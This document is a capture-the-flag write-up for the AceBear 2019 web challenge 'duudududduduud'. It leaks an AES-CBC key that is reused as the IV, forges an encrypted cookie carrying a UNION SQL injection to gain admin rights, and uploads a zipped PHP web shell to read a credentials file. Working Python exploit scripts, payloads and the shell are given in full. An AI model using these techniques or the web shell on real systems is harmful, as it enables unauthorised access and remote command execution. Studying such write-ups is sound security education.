# WEB : duudududduduud

```
Given a website http://54.169.92.223/
And a hint : backup.bak?
```
![website](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/website.png)
> The hint is backup.bak <br>
> Which Means there is a backup file , http://54.169.92.223/backup.bak <br>
> Dowloaded the backup.bak and rename to backup.tgz & Extract it <br>
> There we get the source code <br>

### On Inscepting the [soure code](https://github.com/D1r3Wolf/CTF-writeups/tree/master/Acebear-2019/duudududduduud/backup)
> We need to be a admin in order to upload files <br>
> No one can became an admin <br>
* But There is bug to expliot to became a admin 
> An SQL injection in [login.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/login.php) & This is the only SQL injection in the site
![sql](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/login-php.png)
```php
$username = check_cookie($_COOKIE["session_remember"],$key);
$tmp = $username;
$username = explode("|thisisareallyreallylongstringasfalsfassfasfaasff",$username)[0];
$query = "SELECT username,admin FROM Users WHERE username='$username'";
```
```
$username is directly placed into the $query
But the $username is coming from the check_cookie($_COOKIE["session_remember"])
check_cookie is in /lib/connection.php ,
```
![check_cookie](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/gen_cookie.png)
```
It is an AES decryption ; 
Our need is to make the check_cookie to return our needed string ; For that
We have to send the Our Encrypted Text with the key in server
Then the server decrypts it and returns it ; which leads to the Injection in sql query

For the Encryption we need the Key ::
WE need to leak the Key from the server 
Once again checking the check_cookie function
```
```php
function check_cookie($token,$key)
{
	$aes = new Aes($key, 'CBC', $key);
	$token = base64_decode($token);
	return $aes->decrypt($token);
}
```
```
$aes = new Aes($key, 'CBC', $key);
Here is the Bug , The key is used for IV ;
In aes There is no way to get the Key from Encryption or Decryption
But There is chance to get the IV in AES Decryption
```
![aes](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/aes_cbc.png)
```
Let's Take 2 Block's AES encryption

pt1 = Dec(ct1) ^ iv 		pt2 = Dec(ct2) ^ ct1

What is in our control is cipher text : (ct1,ct2)

Now take ct1 = ct2 = blk

pt1 = Dec(blk) ^ iv 		pt2 = Dec(blk) ^ blk

After Decryption it return pt1 , pt2

Now In [ pt2 = Dec(blk) ^ blk ] we know (blk,pt2)
Then Dec(blk) = pt2 ^ blk 		# Here we get the Dec(blk) value

Now In [ pt1 = Dec(blk) ^ iv ]  we know (pt1, Dec(blk) also)
iv = pt1 ^ Dec(blk)

-----------    iv = pt1 ^ pt2 ^ blk  ----------------------
```
> How we get the plain text ; 
```php
$username = check_cookie($_COOKIE["session_remember"],$key);
$tmp = $username;
$username = explode("|thisisareallyreallylongstringasfalsfassfasfaasff",$username)[0];
$query = "SELECT username,admin FROM Users WHERE username='$username'";
$result = $conn->query($query);
if ($result->num_rows === 1) 
{
	while($row = $result->fetch_assoc())
	{
		$_SESSION["is_logged"] = true;
		$_SESSION["username"] = $row["username"];
		$_SESSION["admin"] = $row["admin"];
		$_SESSION["folder"] = "uploads/".md5($username);
		header("Location: index.php");
		$conn->close();
		exit();
	}
}
else
{
	die("Error : ".base64_encode($tmp)." is not a valid cookie or is expired!");
}
// Here the $tmp is plaintext ; It returns a Error Msg with plaintext
```
### Extracting the IV :: [key.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/key.py)
```py 
from requests import session
from base64 import b64encode,b64decode
url = "http://54.169.92.223/login.php"

def Xor(A,B):
	return ''.join([chr( ord(i)^ord(j) ) for i,j in zip(A,B)])

def Extract_iv():
	S = session()
	S.get(url)
	blk = "A"*16
	cks = {
		"session_remember" : b64encode(blk*2)
	}
	Text = S.get(url,cookies=cks).text
	s = Text.find("Error : ")+8
	e = Text.find(" is not a valid cookie or is expired!")
	Pt = b64decode(Text[s:e])
	pt1 = Pt[:16] ; pt2 = Pt[16:]
	key = Xor( Xor(pt1,pt2) , blk )
	return key
if __name__ == '__main__':
	print (Extract_iv())
```
* output
```
$ python exp.py 
m4ga9-r21kc,!@$!
$
```
> Now we got the Key ; We can send whatever we want by encrypting it <br>
> The server decrypt's it and places it in sql query
### Checking the Injection
```
$query = "SELECT username,admin FROM Users WHERE username='$username'";
There may or maybe admin account's , But there is no need of database concept ;
Because we are in select statement ; we can use UNION

like SELECT username,admin FROM Users WHERE username='' UNION select 'D1r3Wolf',1;#

Simply username = D1r3Wolf
    && admin    = 1 # means true

And there is a stement behind sql query
$username = explode("|thisisareallyreallylongstringasfalsfassfasfaasff",$username)[0];

We need to pad the payload with "|thisisareallyreallylongstringasfalsfassfasfaasff"
```
```py
def pad(S):
	return S + '\x00'*( 16-(len(S)%16) )
payload = "' UNION SELECT 'D1r3Wolf',1;#"
payload += "|thisisareallyreallylongstringasfalsfassfasfaasff"
payload = pad(payload) # Because AES encrytion , decrytion goes in Blocks
```
### Making a cookie: [cookie.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/cookie.py)
```py
from requests import session
from base64 import b64encode,b64decode
from Crypto.Cipher import AES
from key import Extract_iv

def Encrypt(S):
	A = AES.new(key,AES.MODE_CBC,key)
	Ct = A.encrypt(S)
	return b64encode(Ct)

key = Extract_iv()

def pad(S):
	return S + '\x00'*( 16-(len(S)%16) )
payload = "' UNION SELECT 'D1r3Wolf',1;#"
payload += "|thisisareallyreallylongstringasfalsfassfasfaasff"
payload = pad(payload)

cookie = Encrypt(payload)

print "[+] cookie :",cookie
```
* output
```
$ python cookie.py 
[+] cookie : 1FpxWQyccSU6z6xePwv990SfdilJUgIUpg0RHTss5Zcq92uLD6Va4KjpdHpBzpVDAF4SqdtAhYcPJozz99brGSY0c9ERNM1cFk8JLO7VR5Q=
```
### Becoming an admin
```
Go to browser and use the cookie
session_remember : 1FpxWQyccSU6z6xePwv990SfdilJUgIUpg0RHTss5Zcq92uLD6Va4KjpdHpBzpVDAF4SqdtAhYcPJozz99brGSY0c9ERNM1cFk8JLO7VR5Q= # (other cookie value)

```
### here we go
![admin](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/admin.png)
**There is a upload option for admin**
![upload](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload.png)<br>
> Now on checking the [upload.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/upload.php)<br>
```php
$json = json_decode(file_get_contents($_SESSION["folder"]."/manifest.json"),true);
if ($json["type"] !== "h4x0r" || !isset($json["name"]))
{
    exec(sprintf("rm -rf %s", escapeshellarg($_SESSION["folder"])));
    $message = "Your file is invalid.";
}
else
{
    $message = "Your file is successfully unzip-ed. Access your file at ".$_SESSION['folder']."/[your_file_name]";
}
```
```
we can create upload any files
But in those files there mush be a file 'manifest.json'
A json file with "type":"h4x0r","name":"anything" 
```
> [manifest.json](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/manifest.json)
```json
{"type":"h4x0r","name":"D1r3Wolf"}
```
> [cmp.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/cmd.php)
```php
<?php 
if(isset($_GET['cmd'])){ echo "<pre>"; $cmd = ($_GET['cmd']); system($cmd); echo "</pre>"; die; }
?>
```
* zip those two files [evil.zip](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/evil.zip) && upload it to server<br><br>
![upload1](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload1.png)
```
It Provided a path uploads/a3d7ebbe913126890938bdfe90833490/
Access them on http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/
```
![cmd](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/cmd.png)

* OUR backdoor is working :)
* By the Given source code we can know that flag is at [lib/connection.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/lib/connection.php) 
* path is `../../lib/connection.php`
* exploit is `view-source:http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/cmd.php?cmd=cat%20../../lib/connection.php`
* viewing source is important as the browser try's to parse the php ,So it Didn't display the php file properly

![flag](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/flag.png)

```
It is pretty interesting and
I liked this challenge very much
Thanks to
	author: komang4130
```

### flag is : `AceBear{From_Crypt0_m1sus3_t0_Rc3_______}`


